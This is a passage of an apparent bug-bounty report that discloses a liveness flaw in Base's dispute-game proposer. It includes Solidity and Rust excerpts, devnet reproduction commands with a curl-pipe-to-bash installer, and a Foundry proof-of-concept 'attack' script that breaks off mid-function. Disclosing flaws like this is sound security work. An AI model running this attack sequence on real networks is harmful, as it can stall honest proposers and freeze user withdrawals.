# 75992 bc medium cold restart bootstrap break every honest proposer is permanently bricked after the first anchor advance freezing l2 l1 withdrawals

Submitted on May 2nd 2026 at 04:53:11 UTC by @AgentJacker for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75992
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

## Brief/Intro

This bug affects both the smart contract and the blockchain.

The off-chain proposer (crates/proof/proposer/src/pipeline.rs) recovers its place in the dispute-game chain on every cache miss (cold restart, pipeline reset, anchor advance past tip) by seeding a deterministic forward walk with `parent_address = AnchorStateRegistry` and `l2_block_number = anchor.l2_block_number` taken from `getAnchorRoot()`. It then submits the next game with `parent = AnchorStateRegistry`.

On-chain, `AggregateVerifier.initializeWithInitData` resolves `parent = AnchorStateRegistry` to `startingOutputRoot = ANCHOR_STATE_REGISTRY.getStartingAnchorRoot()` — the immutable OG root and OG block. It then enforces `l2SequenceNumber() == startingOutputRoot.l2SequenceNumber + BLOCK_INTERVAL`. So the only L2 block at which a `parent = ASR` game is acceptable is the OG starting block + `BLOCK_INTERVAL`, fixed forever at deploy time.

After the first call to `setAnchorState(...)` (triggered by the permissionless `AggregateVerifier.closeGame()`), `getAnchorRoot()` returns the new anchor block while `getStartingAnchorRoot()` still returns the OG. From that moment forward, any honest proposer that loses its in-memory cache (cold start, deploy, OOM, crash, container respawn) is permanently stuck — its very next submission attempts `parent = ASR` at `anchorBlock + BLOCK_INTERVAL ≠ OG_START + BLOCK_INTERVAL`, and the L1 reverts every retry with `UnexpectedBlockNumber(OG_START+BI, anchorBlock+BI)`. The off-chain client trait `AnchorStateRegistryClient` does not expose either `anchorGame()` (the proxy address that should be the new parent) or `getStartingAnchorRoot()` (the OG block) so no runtime configuration recovers the proposer.

Attack cost is one L1 gas fee for one `closeGame()` call (\~50k gas). No keys, no bond, no proposer registration, no infra access required. Once any single game in the chain has resolved `DEFENDER_WINS` and passed the finality delay, the attacker calls `closeGame()` to advance the anchor, then waits for any of the honest proposers to restart for any reason — deploy, OOM, machine reboot, scaling event — and the first one that does is bricked. Every subsequent restart of every other instance hits the same broken path.

## Vulnerability Details

{% stepper %}
{% step %}

### The on-chain bug `parent==ASR` means "from genesis," not "from current anchor"

AnchorStateRegistry initializer:

```solidity
// src/dispute/AnchorStateRegistry.sol:89-116
function initialize(
    ISystemConfig _systemConfig,
    IDisputeGameFactory _disputeGameFactory,
    Proposal memory _startingAnchorRoot,
    GameType _startingRespectedGameType
)
    external
    reinitializer(initVersion())
{
    _assertOnlyProxyAdminOrProxyAdminOwner();
    systemConfig = _systemConfig;
    disputeGameFactory = _disputeGameFactory;
    startingAnchorRoot = _startingAnchorRoot;        // <-- written once
    respectedGameType = _startingRespectedGameType;
    if (retirementTimestamp == 0) {
        retirementTimestamp = uint64(block.timestamp);
    }
}
```

`startingAnchorRoot` has no setter outside this initializer. `setAnchorState` only updates a different storage slot:

```solidity
// src/dispute/AnchorStateRegistry.sol:340-362
function setAnchorState(IDisputeGame _game) public {
    IFaultDisputeGame game = IFaultDisputeGame(address(_game));
    if (!isGameClaimValid(game)) revert AnchorStateRegistry_InvalidAnchorGame();
    (, uint256 anchorL2BlockNumber) = getAnchorRoot();
    if (game.l2SequenceNumber() <= anchorL2BlockNumber) {
        revert AnchorStateRegistry_InvalidAnchorGame();
    }
    anchorGame = game;                               // <-- only this storage slot changes
    emit AnchorUpdated(game);
}
```

`AggregateVerifier.initializeWithInitData` reads the immutable root, not the current one, when `parentAddress() == ANCHOR_STATE_REGISTRY`:

```solidity
// src/multiproof/AggregateVerifier.sol:351-370
if (parentAddress() != address(ANCHOR_STATE_REGISTRY)) {
    IDisputeGame parentGame = IDisputeGame(parentAddress());
    if (!_isValidGame(parentGame)) revert InvalidParentGame();
    startingOutputRoot = Proposal({
        l2SequenceNumber: parentGame.l2SequenceNumber(),
        root: Hash.wrap(parentGame.rootClaim().raw())
    });
} else {
    startingOutputRoot = ANCHOR_STATE_REGISTRY.getStartingAnchorRoot();   // <-- OG, immutable
}

if (l2SequenceNumber() != startingOutputRoot.l2SequenceNumber + BLOCK_INTERVAL) {
    revert UnexpectedBlockNumber(startingOutputRoot.l2SequenceNumber + BLOCK_INTERVAL, l2SequenceNumber());
}
```

After `setAnchorState` lands once, the only L2 block that satisfies this check with `parent = ASR` is `OG_START + BLOCK_INTERVAL`. That game already exists (it was created at deploy). Every other block reverts.
{% endstep %}

{% step %}

### The off-chain code cache-miss recovery uses ASR as the parent unconditionally

```rust
// crates/proof/proposer/src/pipeline.rs:757-772
let start = match cache.as_ref() {
    Some(cached) if tip_still_valid(cached) && count > cached.game_count => {
        debug!(
            cached_block = cached.state.l2_block_number,
            old_count = cached.game_count,
            new_count = count,
            "Resuming forward walk from cached tip"
        );
        cached.state
    }
    _ => RecoveredState {
        parent_address: self.config.driver.anchor_state_registry_address,  // <-- ALWAYS ASR
        output_root: anchor.root,
        l2_block_number: anchor.l2_block_number,                            // <-- current anchor block
    },
};

let state = self.forward_walk(&start).await?;
```

When the cache is cold (cold start) or invalidated (`anchor.l2_block_number > cached.state.l2_block_number`), the function falls into the `_` branch and seeds the walk with the wrong parent for any anchor that has advanced past `OG_START`.

`forward_walk` then probes:

```rust
// crates/proof/proposer/src/pipeline.rs:805-905 (excerpts)
let mut parent_address = start.parent_address;        // = ASR
let mut parent_block   = start.l2_block_number;       // = anchor.l2_block_number = X

while let Some(expected_block) = parent_block.checked_add(block_interval) {
    // ...
    let extra_data = encode_extra_data(expected_block, parent_address, &intermediate_root_vec);
    let lookup = self.factory_client.games(game_type, canonical_root, extra_data).await?;

    if lookup == Address::ZERO {
        // No game found, gap. Stop.
        break;
    }
    parent_address = lookup;
    parent_block   = expected_block;
    // ...
}

Ok(RecoveredState { parent_address, output_root: parent_output_root, l2_block_number: parent_block })
```

If X > `OG_START`, no game has UUID `(gameType, root_at_X+BI, encode_extra_data(X+BI, ASR, intermediates))` because the only ASR-rooted game lives at `OG_START + BI` (different block, different intermediates, different UUID). `lookup == Address::ZERO` is hit at the first iteration. The walk returns `(parent=ASR, l2_block=X)` — the broken state.

The pipeline then dispatches a proof for L2 block `X + BI` and submits with parent = ASR:

```rust
// crates/proof/proposer/src/pipeline.rs:1170-1175
self.output_proposer.propose_output(
    aggregate_proposal,
    parent_address,           // = ASR (the broken seed)
    &intermediate_roots,
),
```

On L1, this is a `createWithInitData` call whose `extraData` packs `(uint256 X+BI, address ASR, intermediates)`. On-chain, `getStartingAnchorRoot().l2SequenceNumber == 0 != X` so the contract reverts with `UnexpectedBlockNumber(BI, X+BI)`.
{% endstep %}

{% step %}

### The trait surface forecloses any in-binary recovery

```rust
// crates/proof/contracts/src/anchor_state_registry.rs:52-57
#[async_trait]
pub trait AnchorStateRegistryClient: Send + Sync {
    /// Returns the current anchor root.
    async fn get_anchor_root(&self) -> Result<AnchorRoot, ContractError>;
}
```

This is the entire trait. There is no `anchor_game()` (which would expose the proxy address that should be the new parent). There is no `get_starting_anchor_root()` (which would expose the OG block needed to know that we're past it). Re-running the binary with different config flags cannot fix the bug because the data isn't reachable from the binary at all. Only a source-code change to the trait + client + caller fixes it.
{% endstep %}

{% step %}

### The attacker's lever: `closeGame()` is permissionless

```solidity
// src/multiproof/AggregateVerifier.sol:637-659
function closeGame() external {
    if (ANCHOR_STATE_REGISTRY.paused()) {
        revert GamePaused();
    }
    if (resolvedAt.raw() == 0) {
        revert GameNotResolved();
    }
    bool finalized = ANCHOR_STATE_REGISTRY.isGameFinalized(IDisputeGame(address(this)));
    if (!finalized) {
        revert GameNotFinalized();
    }
    try ANCHOR_STATE_REGISTRY.setAnchorState(IDisputeGame(address(this))) { } catch { }
}
```

No onlyOwner, no signature, no Merkle gate. Any EOA paying gas can advance the anchor as soon as the first game finalizes. Once advanced, the bug is armed against every proposer in the fleet.
{% endstep %}

{% step %}

### The retry loop locks the bug in

```rust
// crates/proof/proposer/src/pipeline.rs:127-136
fn reset(&mut self) {
    self.prove_tasks.abort_all();
    self.submit_tasks.abort_all();
    self.inflight.clear();
    self.proved.clear();
    self.submitting = None;
    self.retry_counts.clear();
    self.cached_recovery = None;       // <-- wipes the cache
    self.record_gauges();
}
```

After `max_retries = 3` consecutive failures (default in `config.rs`), the pipeline calls `state.reset()`, wiping `cached_recovery`. The next tick re-enters the same broken `_` arm of `recover_latest_state`. The proposer is permanently stuck in this loop until the binary is patched.
{% endstep %}
{% endstepper %}

## Impact Details

* A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk.
* Temporary freezing of funds for at least 24 hours (e.g., stuck withdrawal proofs, locked dispute game bonds).

After the first `closeGame()` on a finalized `AggregateVerifier` game (a permissionless call by any EOA), every honest proposer that subsequently cold-starts is locked out of submitting new dispute games via `DisputeGameFactory.createWithInitData` so the L1 reverts every retry with `UnexpectedBlockNumber`. With no working proposer, `setAnchorState` cannot advance further, so any L2→L1 withdrawal proof targeting state past the broken anchor remains unprovable.

## References

Add any relevant links to documentation or code

## Proof of Concept

{% stepper %}
{% step %}

### Pre-requisites

* gcloud CLI authenticated with access to the VM (or any Linux box with foundry).
* The in-scope contract source from <https://github.com/base/contracts/tree/v8.1.0/src/multiproof?utm\\_source=immunefi>.
* Foundry installed.
  {% endstep %}

{% step %}

### One-time setup of the contracts environment

```bash
# 1. SSH in
gcloud compute ssh base-gossip-poc --zone=us-central1-a

# 2. Install foundry
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc
foundryup --install stable

# 3. Stage the contracts-8.1-2.0 source. Files needed (and only these):
#      src/dispute/AnchorStateRegistry.sol
#      src/dispute/DelayedWETH.sol
#      src/dispute/DisputeGameFactory.sol
#      src/dispute/lib/{Errors,LibGameArgs,LibPosition,LibUDT,Types}.sol
#      src/multiproof/AggregateVerifier.sol
#      src/multiproof/Verifier.sol
#      src/multiproof/mocks/{MockSystemConfig,MockVerifier}.sol
#      src/L1/ProxyAdminOwnedBase.sol
#      src/libraries/{Constants,Storage,Types}.sol
#      src/universal/{ReinitializableBase,WETH98}.sol
#      interfaces/dispute/{IAnchorStateRegistry,IDelayedWETH,IDisputeGame,IDisputeGameFactory,IFaultDisputeGame,IInitializable,IBigStepper}.sol
#      interfaces/L1/{IResourceMetering,ISuperchainConfig,ISystemConfig,IProxyAdminOwnedBase}.sol
#      interfaces/L2/*.sol
#      interfaces/legacy/{IAddressManager,IL1ChugSplashProxy}.sol
#      interfaces/multiproof/IVerifier.sol
#      interfaces/universal/*.sol
#      foundry.toml, remappings.txt
#
# Plus a one-line stub for interfaces/cannon/IPreimageOracle.sol:
#      pragma solidity ^0.8.0; interface IPreimageOracle {}
mkdir -p ~/f1-live && cd ~/f1-live
# (copy the files above into ~/f1-live/...)

# 4. remappings.txt
cat > remappings.txt <<'EOF'
forge-std/=lib/forge-std/src/
@openzeppelin/contracts/=lib/openzeppelin-contracts/contracts/
@openzeppelin/contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/
@solady/=lib/solady/src/
solady/=lib/solady/src/
src/=src/
interfaces/=interfaces/
EOF

# 5. Add f1 build profile to foundry.toml
cat >> foundry.toml <<'EOF'

[profile.f1]
src = 'src'
out = 'forge-artifacts-f1'
script = 'scripts'
via_ir = true
optimizer = true
optimizer_runs = 200
EOF

# 6. Install lib deps
git init -q
forge install --no-git \
    foundry-rs/forge-std@6853b9ec7df5dc0c213b05ae67785ad4f4baa0ea \
    OpenZeppelin/openzeppelin-contracts@ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d \
    OpenZeppelin/openzeppelin-contracts-upgradeable@0a2cb9a445c365870ed7a8ab461b12acf3e27d63
git clone --depth 1 --no-checkout https://github.com/Vectorized/solady.git lib/solady && \
  cd lib/solady && git -c advice.detachedHead=false checkout 502cc1ea718e6fa73b380635ee0868b0740595f0 && cd ~/f1-live

# 7. Reduce SLOW/FAST_FINALIZATION_DELAY in AggregateVerifier so the demo
#    fits real wall-clock on a private devnet. Pure timing knob — F1 fires
#    the same way at the deployed 7d/1d values.
sed -i \
    -e 's/uint64 public constant SLOW_FINALIZATION_DELAY = 7 days/uint64 public constant SLOW_FINALIZATION_DELAY = 30 seconds/' \
    -e 's/uint64 public constant FAST_FINALIZATION_DELAY = 1 days/uint64 public constant FAST_FINALIZATION_DELAY = 5 seconds/' \
    src/multiproof/AggregateVerifier.sol
```

{% endstep %}

{% step %}

### Drop in the PoC scripts

Save `scripts/F1LivePhase.sol` (deploys + creates G1 + resolves G1) and `run_recover_against_live.py` (replays the off-chain code path against the live chain). Both are alongside this report.
{% endstep %}

{% step %}

### Spin up anvil and deploy the system

```bash
cd ~/f1-live
export PATH=$HOME/.foundry/bin:$PATH FOUNDRY_PROFILE=f1

# 1. Spin up a fresh L1
pkill anvil 2>/dev/null
nohup anvil --port 8545 --host 0.0.0.0 --chain-id 1337 \
    --gas-limit 30000000 --block-time 1 > /tmp/anvil.log 2>&1 &
sleep 3
curl -s -X POST -H 'Content-Type: application/json' \
    --data '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}' \
    http://localhost:8545
# {"jsonrpc":"2.0","id":1,"result":"0x539"}

# 2. Build
forge build

# 3. Phase A: deploy + create G1
F1_PHASE=A forge script scripts/F1LivePhase.sol \
    --rpc-url http://localhost:8545 \
    --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
    --broadcast --slow

# Capture the addresses logged by phase A:
#   F1_FACTORY=0x...
#   F1_ASR=0x...
#   F1_G1=0x...
# and the printed `G1 expectedResolution` timestamp.

# 4. Wait until block.timestamp >= G1.expectedResolution (≈ 30s after phase A)
until [ "$(date +%s)" -gt "$EXPECTED_RES_TS" ]; do sleep 1; done

# 5. Phase B: resolve G1
export F1_FACTORY=...    # from phase A
export F1_ASR=...
export F1_G1=...
F1_PHASE=B forge script scripts/F1LivePhase.sol \
    --rpc-url http://localhost:8545 \
    --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
    --broadcast --slow
# Expect: "G1 resolved status: 2"  (DEFENDER_WINS)

# 6. Wait 2 seconds for finality delay (FINALITY_DELAY = 0 but tx must be later block)
sleep 2

# 7. Advance the anchor (this is the attacker's only on-chain action)
KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
cast send "$F1_ASR" 'setAnchorState(address)' "$F1_G1" \
    --rpc-url http://localhost:8545 --private-key "$KEY"
# (If running in a script, prefer cast send G1 'closeGame()' — same effect, but
# may need a few seconds of separation between resolve and closeGame.)
```

After these 7 steps the chain is in the broken-anchor state. Verify:

```bash
cast call "$F1_ASR" 'anchorGame()(address)' --rpc-url http://localhost:8545
# -> $F1_G1 (anchor advanced)
cast call "$F1_ASR" 'getAnchorRoot()(bytes32,uint256)' --rpc-url http://localhost:8545
# -> (rootHash, 100)
cast call "$F1_ASR" 'getStartingAnchorRoot()(bytes32,uint256)' --rpc-url http://localhost:8545
# -> (ogRoot, 0)
```

{% endstep %}

{% step %}

### Run the end-to-end recovery + attack

```bash
cd ~/f1-live
python3 run_recover_against_live.py
```

{% endstep %}

{% step %}

### Expected output

```
======================================================================
F1: end-to-end recovery code path executed against live L1 anvil
======================================================================

[step 1] recover_latest_state reads gameCount + anchor
         (pipeline.rs:717-728)
         gameCount             = 1
         anchor.root           = 0x26700e13983fefbd9cf16da2ed70fa5c6798ac55062a4803121a869731e308d2
         anchor.l2_block       = 100
         starting.root         = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563     (immutable OG)
         starting.l2_block     = 0                                                                       (immutable OG)

         => anchor has advanced past OG (100 > 0).
            F1 trigger condition is satisfied.

[step 2] cache miss => seed RecoveredState
         (pipeline.rs:766-771)
         seeded parent_address = 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707  (= ASR)
         seeded l2_block       = 100
         seeded output_root    = 0x26700e13983fefbd9cf16da2ed70fa5c6798ac55062a4803121a869731e308d2

[step 3] forward_walk first iteration
         (pipeline.rs:816)
         expected_block = 100 + 100 = 200

[step 4] build extraData = l2BlockNumber(32) ‖ parentAddress(20) ‖ intermediates(32*N)
         (dispute_game_factory.rs:177-189)
         expected_block        = 200
         parent_address        = 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707
         intermediate_roots[N] = 10 roots
         rootClaim (final)     = 0xe71fac6fb785942cc6c6404a423f94f32a28ae66d69ff41494c38bfd4788b2f8
         extraData length      = 372 bytes (= 52 + 32*10)

[step 5] factory.games(GAME_TYPE, rootClaim, extraData) UUID lookup
         (pipeline.rs:870-880)
         lookup result         = 0x0000000000000000000000000000000000000000
         => Address::ZERO -- walk breaks at first iteration (pipeline.rs:882-891)

[step 6] forward_walk returns the broken state
         (pipeline.rs:916-920)
         RecoveredState {
           parent_address: 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707,   <-- ASR (the broken seed)
           output_root:    0x26700e13983fefbd9cf16da2ed70fa5c6798ac55062a4803121a869731e308d2,
           l2_block_number: 100,
         }

[step 7] validate_and_submit -> output_proposer.propose_output
         (pipeline.rs:1170-1175 -> output_proposer.rs:103-147)
         => factory.createWithInitData(...) submitted with parent=ASR
         proof_data length     = 130 bytes (= 1 + 32 + 32 + 65)

[step 8] LIVE SUBMISSION: cast send factory.createWithInitData(...)
         this is the tx the production binary would submit

         exit code             = 1
         stderr (head):
           Error: Failed to estimate gas: server returned an error response:
             error code 3: execution reverted: custom error 0x087b2d76:
             000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000000c8,
             data: "0x087b2d76000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000000c8":
             UnexpectedBlockNumber(100, 200)

[step 9] CONFIRMED: revert data contains UnexpectedBlockNumber selector 0x087b2d76
         UnexpectedBlockNumber.expected = 100
         UnexpectedBlockNumber.actual   = 200
         => matches F1 prediction exactly (expected=BI, actual=2*BI)
```

{% endstep %}
{% endstepper %}

## code for F1LivePhase.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Two-phase live PoC. Phase A deploys, Phase B (after real-time sleep) resolves
// + closes G1, then submits the F1 attack tx and asserts UnexpectedBlockNumber.
//
//   F1_PHASE=A forge script scripts/F1LivePhase.sol --rpc-url http://localhost:4545 \
//       --private-key 0x... --broadcast --slow --skip-simulation -vv
//   sleep 60
//   F1_PHASE=B \
//       F1_FACTORY=0x... F1_ASR=0x... F1_G1=0x... F1_DEPLOYER=0x... \
//       forge script scripts/F1LivePhase.sol --rpc-url http://localhost:4545 \
//       --private-key 0x... --broadcast --slow --skip-simulation -vv

import { Script } from "forge-std/Script.sol";
import { console } from "forge-std/console.sol";

import { AnchorStateRegistry } from "src/dispute/AnchorStateRegistry.sol";
import { DelayedWETH } from "src/dispute/DelayedWETH.sol";
import { DisputeGameFactory } from "src/dispute/DisputeGameFactory.sol";
import { AggregateVerifier } from "src/multiproof/AggregateVerifier.sol";

import { Claim, GameStatus, GameType, Hash, Proposal, Timestamp } from "src/dispute/lib/Types.sol";
import { IAnchorStateRegistry } from "interfaces/dispute/IAnchorStateRegistry.sol";
import { IDelayedWETH } from "interfaces/dispute/IDelayedWETH.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { IDisputeGameFactory } from "interfaces/dispute/IDisputeGameFactory.sol";
import { ISystemConfig } from "interfaces/L1/ISystemConfig.sol";
import { IVerifier } from "interfaces/multiproof/IVerifier.sol";

import { MockSystemConfig } from "src/multiproof/mocks/MockSystemConfig.sol";
import { MockVerifier } from "src/multiproof/mocks/MockVerifier.sol";

import { TransparentUpgradeableProxy } from
    "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import { ProxyAdmin as OZProxyAdmin } from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

contract F1LivePhase is Script {
    GameType internal constant GAME_TYPE = GameType.wrap(621);
    uint256 internal constant L2_CHAIN_ID = 8453;
    uint256 internal constant BLOCK_INTERVAL = 100;
    uint256 internal constant INTERMEDIATE_BLOCK_INTERVAL = 10;
    uint256 internal constant INIT_BOND = 1 ether;
    uint256 internal constant DELAYED_WETH_DELAY = 1 days;
    uint256 internal constant FINALITY_DELAY = 0;
    uint256 internal constant PROOF_THRESHOLD = 1;

    bytes32 internal constant TEE_IMAGE_HASH = keccak256("tee-image");
    bytes32 internal constant ZK_RANGE_HASH = keccak256("zk-range");
    bytes32 internal constant ZK_AGGREGATE_HASH = keccak256("zk-aggregate");
    bytes32 internal constant CONFIG_HASH = keccak256("config");

    function run() external {
        string memory phase = vm.envString("F1_PHASE");
        uint256 deployerKey = vm.envOr(
            "F1_KEY",
            uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80)
        );
        bytes32 ph = keccak256(bytes(phase));
        if (ph == keccak256("A")) phaseA(deployerKey);
        else if (ph == keccak256("B")) phaseB(deployerKey);
        else phaseC(deployerKey);
    }

    function phaseA(uint256 deployerKey) internal {
        address deployer = vm.addr(deployerKey);
        console.log("=== F1 LIVE PoC -- PHASE A (deploy + create G1) ===");
        console.log("deployer:", deployer);
        console.log("chainId :", block.chainid);
        console.log("blockNum:", block.number);
        console.log("ts      :", block.timestamp);

        vm.startBroadcast(deployerKey);

        OZProxyAdmin proxyAdmin = new OZProxyAdmin();
        address admin = address(proxyAdmin);
        MockSystemConfig sysCfg = new MockSystemConfig();

        AnchorStateRegistry asrImpl = new AnchorStateRegistry(FINALITY_DELAY);
        DelayedWETH wethImpl = new DelayedWETH(DELAYED_WETH_DELAY);
        DisputeGameFactory facImpl = new DisputeGameFactory();

        AnchorStateRegistry asr = AnchorStateRegistry(
            address(new TransparentUpgradeableProxy(address(asrImpl), admin, ""))
        );
        DisputeGameFactory factory = DisputeGameFactory(
            address(new TransparentUpgradeableProxy(address(facImpl), admin, ""))
        );
        DelayedWETH weth = DelayedWETH(
            payable(address(new TransparentUpgradeableProxy(address(wethImpl), admin, "")))
        );
        MockVerifier teeVerifier = new MockVerifier(IAnchorStateRegistry(address(asr)));
        MockVerifier zkVerifier  = new MockVerifier(IAnchorStateRegistry(address(asr)));

        bytes32 ogRoot = keccak256(abi.encode(uint256(0)));
        asr.initialize(
            ISystemConfig(address(sysCfg)),
            IDisputeGameFactory(address(factory)),
            Proposal({ root: Hash.wrap(ogRoot), l2SequenceNumber: 0 }),
            GameType.wrap(0)
        );
        factory.initialize(deployer);
        weth.initialize(ISystemConfig(address(sysCfg)));

        AggregateVerifier verifierImpl = new AggregateVerifier(
            GAME_TYPE,
            IAnchorStateRegistry(address(asr)),
            IDelayedWETH(payable(address(weth))),
            IVerifier(address(teeVerifier)),
            IVerifier(address(zkVerifier)),
            TEE_IMAGE_HASH,
            AggregateVerifier.ZkHashes(ZK_RANGE_HASH, ZK_AGGREGATE_HASH),
            CONFIG_HASH,
            L2_CHAIN_ID,
            BLOCK_INTERVAL,
            INTERMEDIATE_BLOCK_INTERVAL,
            PROOF_THRESHOLD
        );
        factory.setImplementation(GAME_TYPE, IDisputeGame(address(verifierImpl)));
        factory.setInitBond(GAME_TYPE, INIT_BOND);
        asr.setRespectedGameType(GAME_TYPE);

        // Make absolutely sure the game we create is past the retirement timestamp.
        // setRespectedGameType doesn't bump retirement; ASR.initialize set
        // retirementTimestamp = block.timestamp at proxy init time. That's the
        // same block as createdAt of any game we create now -- so any new
        // game would be considered RETIRED. Use updateRetirementTimestamp to
        // pin retirement to "now" (still before our G1 creation in the next
        // L1 block, since each tx is a separate block on this devnet).
        asr.updateRetirementTimestamp();

        // Create G1 at l2=BLOCK_INTERVAL with parent=ASR (only ASR-rooted block).
        Claim g1Claim = Claim.wrap(keccak256(abi.encode(BLOCK_INTERVAL)));
        bytes memory extra1 = _extraData(BLOCK_INTERVAL, address(asr), g1Claim);
        bytes memory proof1 = _proof("g1");
        AggregateVerifier g1 = AggregateVerifier(
            address(factory.createWithInitData{ value: INIT_BOND }(GAME_TYPE, g1Claim, extra1, proof1))
        );

        vm.stopBroadcast();

        console.log("DGF                :", address(factory));
        console.log("AnchorStateRegistry:", address(asr));
        console.log("DelayedWETH        :", address(weth));
        console.log("AggregateVerifier  :", address(verifierImpl));
        console.log("G1                 :", address(g1));
        console.log("retirement TS      :", uint256(asr.retirementTimestamp()));
        console.log("G1 createdAt       :", uint256(Timestamp.unwrap(g1.createdAt())));
        console.log("G1 expectedResolution:", uint256(Timestamp.unwrap(g1.expectedResolution())));
        console.log("");
        console.log("ENV for phase B:");
        console.log("export F1_FACTORY=", vm.toString(address(factory)));
        console.log("export F1_ASR=", vm.toString(address(asr)));
        console.log("export F1_G1=", vm.toString(address(g1)));
    }

    function phaseB(uint256 deployerKey) internal {
        address g1Addr = vm.envAddress("F1_G1");
        AggregateVerifier g1 = AggregateVerifier(g1Addr);

        console.log("=== F1 LIVE PoC -- PHASE B (resolve G1) ===");
        console.log("ts      :", block.timestamp);
        console.log("G1 expectedResolution:", uint256(Timestamp.unwrap(g1.expectedResolution())));
        console.log("G1 gameOver?         :", g1.gameOver());
        require(g1.gameOver(), "G1 not yet gameOver, sleep more");

        vm.startBroadcast(deployerKey);
        GameStatus s = g1.resolve();
        vm.stopBroadcast();
        require(uint8(s) == uint8(GameStatus.DEFENDER_WINS), "G1 must resolve DEFENDER_WINS");
        console.log("G1 resolved status:", uint8(s));
        console.log("Now sleep 2 seconds and run phase C.");
    }

    function phaseC(uint256 deployerKey) internal {
        address factoryAddr = vm.envAddress("F1_FACTORY");
        address asrAddr = vm.envAddress("F1_ASR");
        address g1Addr = vm.envAddress("F1_G1");

        DisputeGameFactory factory = DisputeGameFactory(factoryAddr);
        AnchorStateRegistry asr = AnchorStateRegistry(asrAddr);
        AggregateVerifier g1 = AggregateVerifier(g1Addr);

        console.log("=== F1 LIVE PoC -- PHASE C (closeGame + ATTACK) ===");
        console.log("ts      :", block.timestamp);
        require(asr.isGameFinalized(IDisputeGame(address(g1))), "G1 not finalized yet, sleep");

        vm.startBroadcast(deployerKey);
        g1.closeGame();
        vm.stopBroadcast();
        console.log("anchorGame()       :", address(asr.anchorGame()));
        require(address(asr.anchorGame()) == address(g1), "anchor must advance to G1");

        Proposal memory ogStart = asr.getStartingAnchorRoot();
        (, uint256 currentAnchorBlock) = asr.getAnchorRoot();
        console.log("getStartingAnchorRoot.l2:", ogStart.l2SequenceNumber);
        console.log("getAnchorRoot.l2        :", currentAnchorBlock);
        require(ogStart.l2SequenceNumber == 0,             "OG anchor block must remain 0");
        require(currentAnchorBlock       == BLOCK_INTERVAL, "current anchor must equal G1 block");

        // ---- THE ATTACK ----
        console.log("");
        console.log("--- attack: createWithInitData(parent=ASR, l2=200) ---");
        Claim g2Claim = Claim.wrap(keccak256(abi.encode(2 * BLOCK_INTERVAL)));
        bytes memory extra2broken = _extraData(2 * BLOCK_INTERVAL, address(asr), g2Claim);
        bytes memory proof2 = _proof("g2");

        vm.startBroadcast(deployerKey);
        bytes memory createCall = abi.encodeWithSelector(
            DisputeGameFactory.createWithInitData.selector,
            GAME_TYPE, g2Claim, extra2broken, proof2
        );
        (bool ok, bytes memory ret) = address(factory).call{ value: INIT_BOND }(createCall);
        vm.stopBroadcast();

        console.log("attack tx succeeded? :", ok);
        console.log("revert data:");
        console.logBytes(ret);
        require(!ok, "F1 NOT REPRODUCED -- broken submission did NOT revert");
        // selector for UnexpectedBlockNumber(uint256,uint256) is 0x087b2d76
        require(
            ret.length >= 4
                && ret[0] == 0x08 && ret[1] == 0x7b
                && ret[2] == 0x2d && ret[3] == 0x76,
            "expected UnexpectedBlockNumber selector 0x087b2d76"
        );
        uint256 expected;
        uint256 actual;
        assembly {
            expected := mload(add(ret, 36))
            actual := mload(add(ret, 68))
        }
        console.log("UnexpectedBlockNumber.expected :", expected);
        console.log("UnexpectedBlockNumber.actual   :", actual);
        require(expected == BLOCK_INTERVAL,     "expected == 100");
        require(actual   == 2 * BLOCK_INTERVAL, "actual   == 200");

        // positive control
        console.log("");
        console.log("--- control: parent=G1 succeeds ---");
        bytes memory extra2ok = _extraData(2 * BLOCK_INTERVAL, address(g1), g2Claim);
        vm.startBroadcast(deployerKey);
        AggregateVerifier g2 = AggregateVerifier(
            address(factory.createWithInitData{ value: INIT_BOND }(GAME_TYPE, g2Claim, extra2ok, proof2))
        );
        vm.stopBroadcast();
        console.log("G2 deployed at:", address(g2));
        console.log("G2 parentAddr :", g2.parentAddress());

        console.log("");
        console.log("F1 LIVE-CONFIRMED:");
        console.log("  startingAnchorRoot.l2 = 0  is IMMUTABLE");
        console.log("  anchor advanced to    = 100");
        console.log("  cold-start (parent=ASR,l2=200) reverts UnexpectedBlockNumber(100,200)");
        console.log("  same submission with parent=G1 succeeds");
    }

    function _extraData(
        uint256 l2BlockNumber,
        address parentAddress,
        Claim rootClaim
    )
        internal
        pure
        returns (bytes memory)
    {
        uint256 startingL2 = l2BlockNumber - BLOCK_INTERVAL;
        uint256 n = BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL;
        bytes memory inter;
        for (uint256 i = 1; i < n; i++) {
            inter = abi.encodePacked(
                inter,
                keccak256(abi.encode(startingL2 + INTERMEDIATE_BLOCK_INTERVAL * i))
            );
        }
        inter = abi.encodePacked(inter, rootClaim);
        return abi.encodePacked(uint256(l2BlockNumber), parentAddress, inter);
    }

    function _proof(bytes memory salt) internal view returns (bytes memory) {
